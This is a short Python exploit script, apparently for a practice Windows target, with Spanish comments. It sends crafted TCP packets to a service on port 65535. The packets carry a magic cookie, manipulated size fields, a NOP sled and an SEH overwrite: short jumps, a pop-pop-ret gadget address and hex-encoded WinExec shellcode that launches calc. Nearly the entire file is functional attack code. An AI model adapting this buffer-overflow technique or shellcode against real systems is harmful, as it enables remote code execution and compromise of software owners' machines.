#!/usr/bin/python

import socket
import sys
import binascii
from subprocess import Popen, PIPE
import time

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

TCP_IP = socket.gethostname()
TCP_PORT = 65535
BUFFER_SIZE = 1024
buffer_recv =  b"\xFE\xED\xFA\xCE"        # cookie
cmp = b"\x33"                             # check
size = b"\xFF"                            # size
len_buffer_recv_2 = b"\x70\xFE\xFF\xFF"   # MySize, para el segundo aRecv2 # FFFFFE70

# Primer paquete
MESSAGE0 = b""
MESSAGE0 += buffer_recv         # coockie
MESSAGE0 += b"\x00\x01\x00\x00" #MySize
MESSAGE0 += cmp                 # 33 
MESSAGE0 += b"\xFF"                          # size              
MESSAGE0 += b"\x90" * 0xF0 + b"\x58\x58\xC3" # pop pop ret

for i in range(10000):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((TCP_IP, TCP_PORT))
  s.send(MESSAGE0)
  data = s.recv(BUFFER_SIZE)
  s.close()

print("termino")
input()

# Segundo Paquete
MESSAGE0 = b""
MESSAGE0 += buffer_recv         # coockie
MESSAGE0 += b"\xFF\xFF\xFF\xFF" # MySize
MESSAGE0 += b"\x55"*0x448 + b"\xEB\x06" * 2+ b"\x8E\x22\x33\x02" + winexec_calc_shellcode + b"\xEB\xFE" + b"c" * 2000
#MESSAGE0 += b"\x55\x55\x55\x55\x8E\x22\x33\x02" * 0xAE     # nseh / seh
MESSAGE0 += b"\x58" * 10000                         

s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.connect((TCP_IP, TCP_PORT))
s1.send(MESSAGE0)


# 0233228E    90              NOP


  

